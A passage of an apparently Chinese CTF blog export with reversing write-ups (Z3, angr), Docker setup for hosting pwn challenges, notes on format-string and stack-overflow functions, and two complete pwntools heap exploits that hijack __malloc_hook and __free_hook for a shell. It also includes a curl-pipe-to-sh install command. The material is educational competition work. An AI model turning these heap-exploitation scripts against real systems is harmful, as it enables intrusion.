[esp+8h] [ebp-A4h] char flag[80]; // [esp+58h] [ebp-54h] sub_DC1020("Please input your flag: "); sub_DC1050("%40s", flag); memset(xor_result, 0, 0x50u); ii = 0; v4 = strlen(flag); if ( v4 ) &#123; do &#123; flag_i = flag[ii]; jj = 0; do &#123; v7 = &amp;xor_result[jj + ii]; v8 = flag_i ^ data1[jj++]; *v7 += v8; &#125; while ( jj &lt; 0x20 ); ++ii; &#125; while ( ii &lt; v4 ); &#125; v9 = strcmp(xor_result, (const char *)&amp;data2); if ( v9 ) v9 = -(v9 &lt; 0) | 1; if ( v9 ) puts("No, it isn't."); else puts("Yes, it is."); return 0;&#125; 我们利用Z3Py来进行变量的声明和约束的增加并进行求解12345678910111213141516171819202122232425#! /usr/bin/env python2#coding=utf-8from z3 import *s = Solver()X = [BitVec(('x%s' % i),8) for i in range(0x22) ] #生成34个8比特的数print Xdata1 = [0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,0x3A,0x3B,0x3C,0x3D,0x3E,0x3F,0x40,0x5B,0x5C,0x5D,0x5E,0x5F,0x60,0x7B,0x7C,0x7D,0x7E]data2 = [0x72,0xE9,0x4D,0xAC,0xC1,0xD0,0x24,0x6B,0xB2,0xF5,0xFD,0x45,0x49,0x94,0xDC,0x10,0x10,0x6B,0xA3,0xFB,0x5C,0x13,0x17,0xE4,0x67,0xFE,0x72,0xA1,0xC7,0x04,0x2B,0xC2,0x9D,0x3F,0xA7,0x6C,0xE7,0xD0,0x90,0x71,0x36,0xB3,0xAB,0x67,0xBF,0x60,0x30,0x3E,0x78,0xCD,0x6D,0x35,0xC8,0x55,0xFF,0xC0,0x95,0x62,0xE6,0xBB,0x57,0x34,0x29,0x0E,3]xor_result = [0]*0x41for m in range(0,0x22): for n in range(0,0x20): xor_result[n+m] += X[m] ^ data1[n]for o in range(0,0x41): #循环添加约束条件 s.add(xor_result[o] == data2[o]) print s.check()m = s.model()print "traversing model..."flag=''for i in range(0,0x22): flag+=chr(int("%s" % (m[X[i]])))print flag 执行脚本如下:12345(angr) angr@36aeab92fea7:~/z3$ python exp2.py [x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33]sattraversing model...SYC&#123;4+mile+b3gin+with+sing1e+step&#125;]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angr符号执行]]></title>
    <url>%2F2019%2F10%2F02%2Fangr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[简介符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合执行可以尽可能的遍历每一条路径，这样就方便了许多，官方学习文档。 安装这里不建议实体机安装，坑太多，直接上docker，安装教程 例题r100(defcamp)题目和脚本docker里面都有,将程序载入IDA静态分析，主函数如下12345678910111213141516171819202122 signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 result; // rax char s; // [rsp+0h] [rbp-110h] unsigned __int64 v5; // [rsp+108h] [rbp-8h] v5 = __readfsqword(0x28u); printf("Enter the password: ", a2, a3); if ( !fgets(&amp;s, 255, stdin) ) return 0LL; if ( (unsigned int)sub_4006FD((__int64)&amp;s) ) &#123; puts("Incorrect password!"); result = 1LL; &#125; else &#123; puts("Nice!"); result = 0LL; &#125; return result;&#125; 加密函数如下，因为我们这里用符号执行来做，所以不进行算法分析1234567891011121314151617signed __int64 __fastcall sub_4006FD(__int64 a1)&#123; signed int i; // [rsp+14h] [rbp-24h] const char *v3; // [rsp+18h] [rbp-20h] const char *v4; // [rsp+20h] [rbp-18h] const char *v5; // [rsp+28h] [rbp-10h] v3 = "Dufhbmf"; v4 = "pG`imos"; v5 = "ewUglpt"; for ( i = 0; i &lt;= 11; ++i ) &#123; if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 ) return 1LL; &#125; return 0LL;&#125; 需要知道的是，程序有两个分支，输入密码后会进行判断，正确输出nice，错误输入wrong，我们希望的是输出nice，那么这里就可以进行用符号执行来做。先直观感受一下脚本，我们希望执行0x400844中的内容，不希望执行0x400855的内容，脚本如下：123456789101112131415import angrdef main(): p = angr.Project("r100", load_options=&#123;'auto_load_libs': False&#125;) # 加载程序 #约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址 ex = p.surveyors.Explorer(find=(0x400844, ), avoid=(0x400855,)) ex.run() return ex.found[0].posix.dumps(0).strip('\0\n') # 打印found的第一个结果def test(): assert main() == 'Code_Talkers'if __name__ == '__main__': print main() crackme(ais3)同样载入IDA看主函数：12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax if ( argc == 2 ) &#123; if ( (unsigned int)verify((__int64)argv[1]) ) puts("Correct! that is the secret key!"); else puts("I'm sorry, that's the wrong secret key!"); result = 0; &#125; else &#123; puts("You need to enter the secret key!"); result = -1; &#125; return result;&#125; 程序流程还是和上一题很相似，只是需要我们输入正确的参数从而得到flag，加密函数如下，我们同样不需要分析它123456789101112_BOOL8 __fastcall verify(__int64 a1)&#123; int i; // [rsp+14h] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) &#123; if ( encrypted[i] != ((unsigned __int8)((unsigned __int8)(*(_BYTE *)(i + a1) ^ i) &lt;&lt; ((i ^ 9) &amp; 3)) | (unsigned __int8)((signed int)(unsigned __int8)(*(_BYTE *)(i + a1) ^ i) &gt;&gt; (8 - ((i ^ 9) &amp; 3)))) + 8 ) return 0LL; &#125; return i == 23;&#125; 符号执行脚本如下：12345678910111213141516171819202122232425262728293031import angrimport claripy #处理用户输入def main(): project = angr.Project("./ais3_crackme") argv1 = claripy.BVS("argv1",100*8) #猜测flag长度小于100,乘8是转换为字节 initial_state = project.factory.entry_state(args=["./crackme1",argv1]) # 传递参数 sm = project.factory.simulation_manager(initial_state) #象征性地执行程序，直到达到指令指针的要求值 sm.explore(find=0x400602) #在这个指令程序将打印“正确的”消息 found = sm.found[0] #请求符号解算程序以字符串的形式获取处于到达状态的argv1的值 solution = found.solver.eval(argv1, cast_to=str) print repr(solution) solution = solution[:solution.find("\x00")] print solution return solutiondef test(): res = main() assert res == "ais3&#123;I_tak3_g00d_n0t3s&#125;"if __name__ == '__main__': print(repr(main()))]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker安装angr]]></title>
    <url>%2F2019%2F10%2F02%2Fdocker%E5%AE%89%E8%A3%85angr%2F</url>
    <content type="text"><![CDATA[前言angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环境为ubuntu16.64。 配置镜像加速器申请阿里云，修改daemon配置文件/etc/docker/daemon.json来使用加速器，把下方的registry-mirrors换成你的加速器地址。12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; "registry-mirrors": ["https://culfukli.mirror.aliyuncs.com"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker 安装angr1docker pull registry.cn-hangzhou.aliyuncs.com/liujunjie/angr 安装完执行docker images 查看镜像，运行angr1docker run -it registry.cn-hangzhou.aliyuncs.com/liujunjie/angr 上述命令可以执行angr，但不会保存你在其中做的修改，应该用下列命令123456$docker run -itd registry.cn-hangzhou.aliyuncs.com/liujunjie/angr1d443841326281a8c5aee9cfad74893a5eded421eadc3eac2222f91bf15e3eb9$docker exec -it 1d44 bash #1d44为你的id的前四位root@1d4438413262:/# lsbin dev home lib64 mnt proc run srv tmp varboot etc lib media opt root sbin sys usr 这时可以输入命令了，与在linux中操作一样。但在root用户下import angr会失败，用su angr命令切换到angr用户即可。 测试进入到有例子的目录下，执行脚本,可以看到flag。1234567$cd /home/angr/angr-dev/angr-doc/examples/ais3_crackme$lsais3_crackme solve.py$python solve.py 'ais3&#123;I_tak3_g00d_n0t3s&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'ais3&#123;I_tak3_g00d_n0t3s&#125;'ais3&#123;I_tak3_g00d_n0t3s&#125;' 拷贝文件主机向docker中拷贝：1docker cp (本地文件路径) (docker container id):(容器中路径) docker向主机中拷贝：1docker cp (docker container id):(容器中路径) (本地文件路径) 容器操作查看容器进程1docker ps -a 打开容器1docker start container_id 关闭容器1dockr stop container_id 删除容器1docker rm container_id 导出容器1docker export container_id &gt; 容器快照名 镜像操作查看镜像1docker images 导入镜像1docker pull 镜像名称 运行images1docker run -it 镜像名称 bash 删除images1docker rmi image_id]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习pwn的心理路程]]></title>
    <url>%2F2019%2F10%2F02%2F%E5%AD%A6%E4%B9%A0pwn%E7%9A%84%E5%BF%83%E7%90%86%E8%B7%AF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[(o≖◡≖)(๑•̀ㅂ•́)و✧(*￣ω￣)w(ﾟДﾟ)wo(≧口≦)oΣ( ° △ °|||)︴]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数字经济 pwn fkroman writeup]]></title>
    <url>%2F2019%2F09%2F28%2F%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20fkroman%20writeup%2F</url>
    <content type="text"><![CDATA[思路 利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址 再用uaf漏洞劫持malloc_hook为one_gadget exp本地环境：ubuntu 16.04，成功率不高123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/env python2from pwn import *context(log_level='debug', arch='amd64', os='linux')exe = './fkroman'lib = './libc-2.23.so'ip = '121.40.246.48'port = 9999elf = ELF(exe)libc = ELF(lib)def dbg(script=''): attach(io, gdbscript=script)def choice(idx): io.sendlineafter('Your choice: ', str(idx))def index(idx): io.sendlineafter('Index: ', str(idx))def add(idx, size): choice(1) index(idx) io.sendlineafter('Size: ', str(size))def dele(idx): choice(3) index(idx)def edit(idx, size, content): choice(4) index(idx) io.sendlineafter('Size: ', str(size)) io.sendafter('Content: ', content)# ------------------------------------------------LOCAL = 1iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157libc_off = 0x7ffff7dd2600-0x7ffff7a0d000onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]# ------------------------------------------------def exp(): add(0, 0x70-8) #0 add(1, 0x70-8) #1 add(2, 0x90-8) #2 add(3, 0x20-8) #3#-------------------leak libc--------------------- dele(1) dele(0) dele(2) edit(0, 1, p8(0xe0)) edit(1, 0x70, 'A'*0x68+p64(0x71)) edit(2, 2, p16(iofile_off[0])) #gdb.attach(io) add(4, 0x70-8) #0 #gdb.attach(io) add(5, 0x70-8) #2 #gdb.attach(io) add(6, 0x70-8) #target #gdb.attach(io) edit(6, 0x54, 'A'*3+p64(0)*6+p64(0x00000000fbad1800)+p64(0)*3+"\x00") #gdb.attach(io) io.recv(0x40) recv_addr=u64(io.recv(8)) log.info('libc-&gt;'+hex(recv_addr)) pause() libc.address = recv_addr - libc_off log.info(hex(libc.address))#-------------------malloc_hook------------------- add(7, 0x70-8) #2 edit(7, 0x70, 'B'*0x68+p64(0x21)) dele(7) info(hex(libc.sym['__malloc_hook']-0x23)) pause() edit(7, 8, p64(libc.sym['__malloc_hook']-0x23)) #0x7fefcf441aed _IO_wide_data_0+301 gdb.attach(io) add(8, 0x70-8) #2 add(9, 0x70-8) #target2 gdb.attach(io) info(hex(libc.address+onegadgets[1])) pause() edit(9, 0x1b, 'C'*0x13+p64(libc.address+onegadgets[1])) #0x7fefcf0c226a #gdb.attach(io) add(10, 0) io.interactive()# ------------------------------------------------if __name__ == '__main__': for i in range(100): try: if LOCAL: io = elf.process() env=&#123;"LD_PRELOAD": libc.path&#125; else: io = remote(ip, port) exp() except: print i 参考文章:https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dghttps://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn题的搭建]]></title>
    <url>%2F2019%2F09%2F25%2Fpwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[本地搭建1socat tcp-l:6666,fork exec:./pwn,reuseaddr 测试1234$nc 0.0.0.0 6666lsflagpwn 也可以加个nohup，还可以再加个&amp;1nohup socat tcp-l:6666,fork exec:./pwn,reuseaddr 1nohup socat tcp-l:6666,fork exec:./pwn,reuseaddr&amp; 他们的作用分别是使用&amp;后台运行程序： 结果会输出到终端 使用Ctrl + C发送SIGINT信号，程序免疫 关闭session发送SIGHUP信号，程序关闭 使用nohup运行程序： 结果默认会输出到nohup.out 使用Ctrl + C发送SIGINT信号，程序关闭 关闭session发送SIGHUP信号，程序免疫 dockr搭建pwn题开源项目地址: https://github.com/Eadom/ctf_xinetd克隆下来之后，在当前目录下执行如下命令 建造镜像1docker build -t pwn-docker:16.04 . 若想搭建为18.04的环境，将dockerfile文件里面FROM ubuntu:16.04改为 FROM ubuntu:18.04123456789101112131415161718192021222324252627282930313233343536373839FROM ubuntu:16.04 #修改的地方RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \ apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \ apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y vimRUN useradd -m ctfWORKDIR /home/ctfRUN cp -R /lib* /home/ctf &amp;&amp; \ cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev &amp;&amp; \ mknod /home/ctf/dev/null c 1 3 &amp;&amp; \ mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \ mknod /home/ctf/dev/random c 1 8 &amp;&amp; \ mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \ chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin &amp;&amp; \ cp /bin/sh /home/ctf/bin &amp;&amp; \ cp /bin/ls /home/ctf/bin &amp;&amp; \ cp /bin/cat /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_failRUN chmod +x /start.shCOPY ./bin/ /home/ctf/RUN chown -R root:ctf /home/ctf &amp;&amp; \ chmod -R 750 /home/ctf &amp;&amp; \ chmod 740 /home/ctf/flagCMD [&quot;/start.sh&quot;]EXPOSE 9999 然后创建容器，并做端口转发1docker run -p 0.0.0.0:9997:9999 pwn-docker:16.04 最后在物理机上访问9997端口,测试成功1234567891011$nc 0.0.0.0 9997lsbindevflagliblib32lib64pwncat flagctf&#123;please_initialize_this_flag&#125; 更换题目可用docker cp命令替换/home/ctf目录下的helloworld，并修改/etc/xinetd.d/ctf里面的题目名称1234567891011121314151617181920service ctf&#123; disable = no socket_type = stream protocol = tcp wait = no user = root type = UNLISTED port = 9999 bind = 0.0.0.0 server = /usr/sbin/chroot # replace helloworld to your program server_args = --userspec=1000:1000 /home/ctf ./helloworld #修改的地方 banner_fail = /etc/banner_fail # safety options per_source = 10 # the maximum instances of this service per source IP address rlimit_cpu = 20 # the maximum number of CPU seconds that the service may use #rlimit_as = 1024M # the Address Space resource limit for the service #access_times = 2:00-9:00 12:00-24:00&#125; 同时搭建多题开源项目地址： https://github.com/giantbranch/pwn_deploy_chroot 准备工作123456# 安装dockercurl -s https://get.docker.com/ | sh #已安装过的跳过# 安装 docker compose 和gitapt install docker-compose git# 下载git clone https://github.com/giantbranch/pwn_deploy_chroot.git 克隆下来之后，只需三步就可以搭建多道pwn题，并自动生成flag，获取到shell自动cat flag 将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名） python initialize.py docker-compose up –build -d 1234$python initialize.py &#123;"flag": "flag&#123;9c900d02-8567-4e16-8952-47a92d2dc06a&#125;", "port": 10000, "filename": "pwn1"&#125;&#123;"flag": "flag&#123;6f785f9e-fb19-4b54-9c6c-dd9b6f62041a&#125;", "port": 10001, "filename": "pwn1_copy1"&#125;&#123;"flag": "flag&#123;c65a3be4-a9d1-4122-b981-7a241ca73027&#125;", "port": 10002, "filename": "pwn1_copy2"&#125; 1docker-compose up --build -d 测试12$nc 0.0.0.0 10000pwn test 更换题目先把开启的容器删除掉，再执行上面三步即可。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数字经济 pwn amazon writeup]]></title>
    <url>%2F2019%2F09%2F25%2F%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20amazon%20writeup%2F</url>
    <content type="text"><![CDATA[思路1、利用glibc-2.27的tcache机制连续释放八次unsortedbin，再输出，可以leak出libc的基址2、利用unsortedbin的合并，overlap修改tcache表的fd位为_free_hook的地址3、提前把”$0\x00”(/bin/sh)写入到堆块中4、申请堆块到_free_hook附近，修改__free_hook为system,5、释放堆块，得到shell exp本地环境：ubuntu 18.04 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/python2.7 # -*- coding: utf-8 -*-from pwn import *context.log_level = "debug"context.arch = "amd64"exe = './amazon'elf = ELF(exe)one = [0x4f2c5, 0x4f322, 0x10a38c]#------------------------------------def d(s = ''): gdb.attach(p ,s)def manu(idx): p.sendlineafter('choice: ', str(idx))def add(num, size, note): manu(1) p.sendlineafter('buy: ', str(1)) p.sendlineafter('many: ', str(num)) p.sendlineafter('note: ', str(size)) p.send(note)def add1(num, size, note): manu(1) p.sendlineafter('buy: ', str(1)) p.sendline(str(num)) p.sendline(str(size)) p.sendline(note)def show(): manu(2)def checkout(idx): manu(3) p.sendlineafter('for: ', str(idx))def pwn(): add(2, 0x80, 'a') #0 add(2, 0xa0, 'A') #1 add(2, 0x90, 'A') #2 add(2, 0x10, 'A') #3 for i in range(8): checkout(0) for i in range(8): checkout(2) show() p.recvuntil('Name: ') libc.address = u64(p.recv(6).ljust(8, '\x00')) - 0x3ebca0 success('libc.address---&gt;'+hex(libc.address)) for i in range(8): checkout(1) add(2, 0x100, '\xff'*0x80 +p64(3)+p64(0xa1) + p64(libc.sym['__free_hook']-0x40)) #0 1 checkout(0) add(2, 0xa0, 'a'*0x8)#4 add(2, 0x100, '\x99'*0x80 +p64(3)+p64(0xa1) + '$0\x00') #5 add(2, 0xa0, '\x00'*0x20+p64(libc.sym['system'])) #d() checkout(5) p.interactive()#-------------------------------------if __name__ == '__main__': l = 1 if l: p = process(exe) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: p = remote('121.41.38.38', 9999) libc = ELF('libc-2.27.so') pwn() 参考文章：https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.htmlhttps://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux c alarm函数]]></title>
    <url>%2F2019%2F09%2F11%2Flinux-c-alarm%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[alarmalarm称为闹钟函数，alarm()用来设置信号SIGALRM在经过参数seconds指定的秒数后传送给目前的进程。如果参数seconds为0，则之前设置的闹钟会被取消，并将剩下的时间返回。要注意的是，一个进程只能有一个闹钟时间，如果在调用alarm之前已设置过闹钟时间，则任何以前的闹钟时间都被新值所代替。 所需头文件 1#include &lt;unistd.h&gt; 函数原型1unsigned int alarm（unsigned int seconds) 函数参数 seconds:指定秒数函数返回值 成功：如果调用此alarm（）前，进程已经设置了闹钟时间，则返回上一个闹钟时间的剩余时间，否则返回0。 出错：-1 示例1234567891011121314151617181920212223#include&lt;unistd.h&gt;#include&lt;signal.h&gt;void handler()&#123; printf("Hello\n"); signal(SIGALRM, handler); //让内核做好准备，一旦接受到SIGALARM信号,就执行 handler alarm(5);&#125; void main()&#123; int i; handler(); for(i=1;i&lt;21;i++) &#123; printf("sleep %d ...\n",i); sleep(1); &#125;&#125; 结果：刚开始在main中执行一次，然后每隔5秒执行一次handler()12345678910111213141516171819202122232425Hellosleep 1 ...sleep 2 ...sleep 3 ...sleep 4 ...sleep 5 ...Hellosleep 6 ...sleep 7 ...sleep 8 ...sleep 9 ...sleep 10 ...Hellosleep 11 ...sleep 12 ...sleep 13 ...sleep 14 ...sleep 15 ...Hellosleep 16 ...sleep 17 ...sleep 18 ...sleep 19 ...sleep 20 ...Hello 注意：alarm只设定一个闹钟，时间到达并执行其注册函数之后，闹钟便失效。如果想循环设置闹钟，需在其注册函数中在调用alarm函数。]]></content>
      <categories>
        <category>c</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串漏洞]]></title>
    <url>%2F2018%2F11%2F29%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 什么是格式化字符串学过c语言的都知道printf，fprintf，sprintf等这一类printf函数中经常用到”%”，后面加一个或多个字符串做说明符。格式化字符串指的就是printf函数第一个参数，最常见的包括： 123456%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数 printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。我们就利用这个漏洞实现任意地址写 0x01 漏洞原理产生漏洞的原因就是没写格式化控制符,如123char str[100];scanf(&quot;%s&quot;,str);printf(str); 事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。 一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。 举个栗子，主函数如下：程序很简单，可以多次输入方便调试，memset函数先把buf都初始化为0，然后read函数读取键盘操作，输入buf最后在输出buf。 正常情况下我们输入什么都会输出什么，但是当我们输入一些特定的字符时输出出现了变化。 0x02利用格式化字符串漏洞实现任意地址读]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从非缓冲系统文件到常见栈溢出函数]]></title>
    <url>%2F2018%2F11%2F12%2F%E4%BB%8E%E9%9D%9E%E7%BC%93%E5%86%B2%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%88%B0%E5%B8%B8%E8%A7%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[非缓冲和缓冲是相对而言的了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。 什么是缓冲文件系统？程序在运行过程中，会自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。 作用用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。 代表函数(c语言)缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等 非缓冲文件系统特点非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。 代表函数缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等 栈溢出常见函数 函数 功能 可利用漏洞 read() 读取文件内容到缓冲区 读到\x00和指定字节 write() 把缓冲区的内容写入到文件内 写到\x00和指定字节 gets() 从输入缓冲区中读取一个字符串存储到字符指针 可无限输入 puts() 输出字符串,相当于printf(“%s\n”,s) 输出直到\x00 strcpy() 只能复制字符串 一直复制直到遇到\x00 memcpy() 复制任意内容 指定字节 strncpy() 复制指定字节字符 指定字节 printf() 格式化输出 输出直到\x00 scanf() 格式化输入 输入与定义不同的类型或输入多与定义的数组元素 下面是详细内容: 0x00 read()函数原型12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t nbyte) fd：文件描述符；fd为0从键盘读取buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要读入文件指定的字节数； 功能read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。 返回值成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题. 0x01 write()函数原型12#include &lt;unistd.h&gt;ssize_t write(int fd,const void *buf,size_t nbytes) fd：文件描述符；fd为1输出到显示器buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数； 功能write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动. 返回值如果顺利write()会返回实际写入的字节数.当有错误发生时则返回-1, 错误代码存入errno 中. 错误代码： EINTR 此调用被信号所中断. EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值. EADF 参数fd 非有效的文件描述词, 或该文件已关闭 0x02 gets()函数原型12# include &lt;stdio.h&gt;char *gets(char *str); 功能gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。 注意使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了 gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。 0x03 strcpy()和memcpy()和strncpy()函数原型123char* strcpy(char* dest, const char* src)void *memcpy( void *dest, const void *src, size_t count );char *strncpy(char *dest,char *src,int size_t n); dest:指向用于存储复制内容的目标数组。src:要复制的字符串。count：要读入文件指定的字节数； 注意 strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。 复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。 用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节 0x04 printf()和scanf()引入：华为的一道经典面试 i的值输出是多少呢，没有考虑栈溢出的话，i就是5。可这里栈溢出了，i=6776421 ，这是为什么呢？进入到内存中分析：连续定义的变量，内存地址一般也相邻首先依次在栈区为变量开辟空间（注意方式，整形是4个字节以计算，char型一字节一计算）a,b,c,d,e对应的ASCII码对照表的16进制为0x61,0x62,0x63,0x64,0x65 越界后： 所以最后的结果是0x676665的十进制6776421]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[open、fopen和popen]]></title>
    <url>%2F2018%2F11%2F07%2Fopen%E3%80%81fopen%E5%92%8Cpopen%2F</url>
